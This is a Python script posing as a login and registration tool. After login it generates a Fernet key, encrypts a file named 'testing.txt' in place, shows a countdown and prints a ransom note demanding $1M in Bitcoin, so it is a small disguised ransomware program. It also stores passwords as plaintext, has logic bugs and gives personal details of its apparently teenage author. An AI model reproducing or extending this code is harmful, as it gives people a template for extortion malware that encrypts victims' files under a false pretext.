import os
import time
from cryptography.fernet import Fernet
print('''
[#] Please run the program fullscreen for better visual and better text shown in the UserInterface.
[#] Important Note:
1. One Account/PC, it means you can't register two account because the database can only hold 1 account for now.
2. If you register with a new username and password(can use any password) the database will overwrite the previous user pass and change into the new one.
3. You can contact the devloper at his Whatsapp Number 1234567890, lol sorry can't give my number
''')

# Main UI (UserInterface)
print_user_greeting = print('''
[@] Hello New User!
[#] To use this software you need to register an account here''')
user_option = int(input('''
[#] Select an option(ie. 1 or 2)
0. About Me
1. Register
2. Login
3. Decrypter (will add very soon)
4. Forgot Username (coming soon......)
5. Forgot Password (coming soon......)
6. Forgot Both 3 and 4 option (is also coming when option 3 and 4 are available)

Select Option: '''))

# Required arg for the input functio for both register and login options
register_username = 'Enter a Username for the registration here: '
register_password = 'Enter a Password for the Username registration here: '

login_username = 'Enter the Username here: '
login_password = 'Enter the password here: '

# Main part for all the options


def main_section():
    # This is the part for the new user choosing their option(mainly option 1, as they are new user who just go this software/program)
    def registration():
        if user_option == 1:
            available_username = input(register_username)
            read_userdata = open('username_database.txt', 'r')
            if available_username == read_userdata.readline():
                print('# Name is already in the database!')
                warning = input(
                    '# Do you want to register a new account again with the same username, if then your your previous account user pass data will be deleted and replace by the new one | y/n: ')
                if warning == 'y':
                    changed_password = input(register_password)
                    with open('username_database.txt', 'w') as changed_user:
                        changed_user.write(available_username)
                    with open('password_database.txt', 'w') as changed_pass:
                        changed_pass.write(changed_password)
                    print('\n')
                    print('You have overwrite your previous user pass data')
                    print(
                        '\Rerun again and choose the login option 2 to run this program')
                    input('Type y to close the program: ')

            elif available_username != read_userdata.readline:
                password = input(register_password)
                with open('username_database.txt', 'w') as user_data:
                    user_data.write(available_username)
                with open('password_database.txt', 'w') as pass_data:
                    pass_data.write(password)
                print('\n')
                print(
                    'Registration has been successfull, you may now close this window and rerun again this as login option, ie. 2')
                input('Enter y to close the program: ')
    registration()

    def login():
        if user_option == 2:
            read_userdata = open('username_database.txt', 'r')
            read_passdata = open('password_database.txt', 'r')
            username_login = input(login_username)
            password_login = input(login_password)
            if username_login == read_userdata.readline() and password_login == read_passdata.readline():
                print('You have now successfully login!. Do you want to run it?')
                run = input('y/n: ')
                if run == 'y':
                    # Need to put the encrypting code here
                    generate_key = Fernet.generate_key()
                    with open('encryption_key.key', 'wb') as key_file1:
                        key_file1.write(generate_key)
                    with open('encryption_key.key', 'rb') as key_file2:
                        key_file = key_file2.read()
                        key = key_file.decode()
                    fernet = Fernet(key)
                    with open('testing.txt', 'rb') as file:
                        encrypting_file = file.read()
                    encrypted = fernet.encrypt(encrypting_file)
                    with open('testing.txt', 'wb') as encrypted_file:
                        encrypted_file.write(encrypted)
                    print('\n')

                    def countdown(t):
                        while t:
                            mins, secs = divmod(t, 60)
                            timer = '{:02d}:{:02d}'.format(mins, secs)
                            print(timer, end="\r")
                            time.sleep(1)
                            t -= 1
                        print('\n')
                        print('''
Your computer has been affected by my malware and has encrypted all your data in the current directory.
If you want to decrypt all your data then you need to open this program again and choose the 3rd option(Decrypter)
But the main twist is here, you need a key to use the Decrypter and you will only get the key from me because I have manually made the key by myself.
The only option to get the key is to give me BTC $1M to this address: 5nkjgb4hity4nkkj23

If you don't believe me then try to open any one your data file and check it
After the transaction(send) of right amount of BTC to my address
Contact me throught Discord: H I T M A N#1403
And you will get the key for the Decrypter!!!!!!!!''')
                        print('\n')
                        input('Enter y to close to the program: ')
                    print('\n')
                    print(
                        "[#] PLEASE WAIT UNTIL THE COUNTDOWN IS FINISHED AND PLEASE DON'T CLOSE THE PROGRAM!!!!")
                    t = 30
                    countdown(t)
                elif run == 'n':
                    def n_countdown(t):
                        while t:
                            mins, secs = divmod(t, 60)
                            timer = '{:02d}:{:02d}'.format(mins, secs)
                            print(timer, end="\r")
                            time.sleep(1)
                            t -= 1
                        print('You can rerun the program again.')
                        input('Enter y to close the program: ')
                    print('\n')
                    t = 10
                    n_countdown(t)
            elif username_login != read_userdata.readline() or password_login != read_passdata.readline():
                print('\n')
                print('Wrong Username or Password')
                print('Try running again the program and try to login again')
                print('\n')
                input('Enter y to close the program: ')
    login()

    def aboutme():
        if user_option == 0:
            print('''
            My Name: Moirangthem Henthoiba (Surname = Moirangthem and Name = Henthoiba)
            My Age: Currently 16 years old (but coming 21st Nov, 2022 I will be 17 years old)
            Country Where I Live: India
            State: Manipur (North East Part of India)
            Future Dream Job: Software Engineer at one of the FAANG Companies''')
            print('\n')
            input('''
            Enter y to close the program: ''')
    aboutme()
main_section()
